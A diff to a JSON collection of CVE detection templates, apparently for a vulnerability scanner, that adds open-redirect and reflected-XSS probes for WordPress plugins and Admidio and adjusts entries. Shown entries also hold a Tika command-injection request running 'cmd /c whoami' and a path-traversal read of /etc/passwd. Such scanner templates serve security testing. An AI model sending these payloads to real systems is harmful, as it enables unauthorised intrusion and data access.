@@ -6006,11 +6006,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -12574,10 +12574,25 @@
       ]
     },
     {
+      "id": "CVE-2021-24838",
+      "info": {
+        "name": "AnyComment <= 0.2.21 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://example.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24997",
       "info": {
         "name": "CVE-2021-24997",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -13037,7 +13052,7 @@
     {
       "id": "CVE-2021-29156",
       "info": {
-        "name": "LDAP Injection In Openam",
+        "name": "LDAP Injection In OpenAM",
         "severity": "high"
       },
       "requests": [
@@ -14150,6 +14165,21 @@
       ]
     },
     {
+      "id": "CVE-2021-39350",
+      "info": {
+        "name": "FV Flowplayer Video Player WordPress plugin  - Authenticated Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=fv_player_stats&player_id=1</script><script>alert(document.domain)</script> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-39433",
       "info": {
         "name": "BIQS IT Biqs-drive v1.83 LFI",
@@ -14731,6 +14761,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-43810",
+      "info": {
+        "name": "Admidio - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/adm_program/system/redirect.php?url=javascript://%250aalert(document.domain)"
           ]
         }
       ]
